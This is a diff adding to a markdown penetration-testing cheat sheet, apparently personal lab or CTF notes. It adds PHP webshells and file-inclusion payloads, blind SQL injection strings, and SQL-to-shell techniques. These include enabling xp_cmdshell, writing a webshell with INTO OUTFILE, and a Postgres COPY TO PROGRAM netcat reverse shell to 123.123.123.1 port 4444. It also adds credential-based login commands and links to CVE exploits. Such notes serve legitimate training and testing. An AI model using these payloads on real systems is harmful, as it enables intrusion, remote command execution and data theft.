@@ -95,9 +95,21 @@ POST request with json type
 	/sitemap.xml
 .  
 
+### Wordpress plugin scan
+	wpscan --url http://123.123.123.123
+
 ### Webshells
-	<?php system("whoami")?>
+	<?php echo system("whoami"); ?>
 PHP webshell  
+
+	<?php echo system($_GET['cmd']); ?>
+parameter webshell: `http://URL/vulnerable.php?cmd=whoami` or `http://URL/index.php?page=vulnerable&cmd=whoami`  
+
+	http://URL/vulnerable.php?page=data://test/plain,<?php$20echo%20system('whoami');?>
+data wrapper  
+
+	http://URL/vulnerable.php?page=data://test/plain,base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
+base64 encoded data wrapper  
 
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
@@ -112,17 +124,64 @@ Set inputs to 0
 	...; id #
 Include # to comment out code behind  
 
-## MSSQL
+### MySQL Blind
+	INJECTION and if (1=1,sleep(3),'false')
+
+### MSSQL Blind
+	INJECTION;waitfor delay '0:0:3';
+
+### Postgres Blind
+	INJECTION;select pg_sleep(3)--
+
+## SQL info extraction
+### list db
+	select schema_name from information_schema.schemata
+if dbo is listed, server is MSSQL. use `select name from sys.databases` instead  
+
+### list tables mysql
+	select table_name from information_schema.tables where table_schema='db'
+
+### list tables mssql
+	select table_name from db.information_schema.tables
+
+### list columns mysql
+	select column_name, data_type from information_schema.columns where table_schema='db' and table_name='table'
+to reference a table, use `db.table`  
+
+### list tables mssql
+	select column_name, data_type from db.information_schema.columns where table_name='table'
+to reference a table, use `db.dbo.table`  
+
+### postgresql error output
+	INJECTION'; DO $$ BEGIN RAISE EXCEPTION '%', (SELECT string_agg(datname, ', ') FROM pg_database);END; $$;-- - 
+if site only shows output on error, use this to run queries and output it as error. String_agg concats all rows
+
+## SQL to shell
+### mssql
+	EXECUTE sp_configure 'show advanced options', 1;
+	RECONFIGURE;
+	EXECUTE sp_configure 'xp_cmdshell', 1;
+	RECONFIGURE;
+	EXECUTE xp_cmdshell 'whoami';
+
+### mysql
+	INJECTION' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/webshell.php"; -- - 
+Disk location must be writable. Find a way to execute the php file  
+
+### postgres
+	'; COPY (SELECT '') to program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 123.123.123.1 4444 >/tmp/f';-- - 
+
+## SQL Misc
 ### mssqlpwner
 	mssqlpwner domain/user:password@123.123.123.123 interactive
 Flags: Connect to SQL server in interactive shell  
 
 	mssqlpwner domain/user:password@123.123.123.123 direct-query "execute as login = appdev;use databasename;select * from users"
 Flags: Execute direct query, impersonate as appdev, dump users table  
+
 ### nxc
 	nxc mssql 123.123.123.123 -u user -p password --rid-brute > rid-output.txt
 Flags: Domain username RID bruteforce, save results  
-
 
 ## Password Cracking
 ### MD5 Rainbow Table
@@ -141,6 +200,10 @@ password guess. Use `-L userlist.txt and -p password` for password spray
 ## Compromised User Access
 ### SSH
 	ssh user@123.123.123.123
+with input password  
+
+	ssh -i rsa.file -p 10000 user@123.123.123.123
+with rsa private key, over port 10000  
 
 ### WinRM
 	evil-winrm -i 123.123.123.123 -u username -p password
@@ -155,6 +218,13 @@ List shares
 
 	impacket-psexec username:password@123.123.123.123
 Use `\` to escape special characters in password. Requires admin  
+
+### MSSQL login
+	impacket-mssqlclient user:password@123.123.123.123 -windows-auth
+windows-auth uses NTLM  
+
+### MySQL login
+	mysql -u user -p'pass' -h 123.123.123.123 -P 3306 --skip-ssl-verify-server-cert
 
 # STAGE 3 - PRIVILEGE ESCALATION
 ## Weakness Enumeration (Linpeas/Winpeas)
@@ -365,8 +435,17 @@ GET/POST parameters
 ## Vulnerabilities
 |Software|Version|CVE|Link|
 |---|---|---|---|
-|Docker Desktop for Windows|4.44.2|CVE-2025-9074|https://github.com/BridgerAlderson/CVE-2025-9074-PoC|
-|Cacti|1.2.29|CVE-2025-24367|https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC|
-|pkexec||CVE-2021-4034|https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures|
-|vsftpd|2.3.4|CVE-2011-2523|https://www.exploit-db.com/exploits/49757|
+|Docker Desktop for Windows|4.44.2|CVE-2025-9074|[CVE-2025-9074-PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC)|
+|Cacti|1.2.29|CVE-2025-24367|[CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)|
+|pkexec||CVE-2021-4034|[pwnkit](https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures)|
+|vsftpd|2.3.4|CVE-2011-2523|[Exploitdb](https://www.exploit-db.com/exploits/49757)|
 |Apache|2.4.49|CVE-2021-41773|see url path traversal|
+|Grafana|8.3.0 and more|CVE-2021-43798|[grafana-cve-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798)|
+|Perfect Survey (Wordpress)|<1.5.2|CVE-2021-24762|[metasploit-module](https://github.com/aaryan-11-x/My-Metasploit-Modules/blob/main/CVE-2021-24762%3A%20WordPress%20Plugin%20Perfect%20Survey%201.5.1%20-%20SQLi%20(Unauthenticated)/wp_perfect_survey_sqli.rb)|
+
+
+## Quote escapes
+	curl -H 'Custom-Header: <?php echo system($_GET['\''cmd'\'']); ?>'
+Use `''` to escape all other special characters. Close quote and `\'` and reopen to include one single quote  
+
+For double quotes, `$`, `` ` ``, `"`, `\`, `!` must be escaped with backslash.  
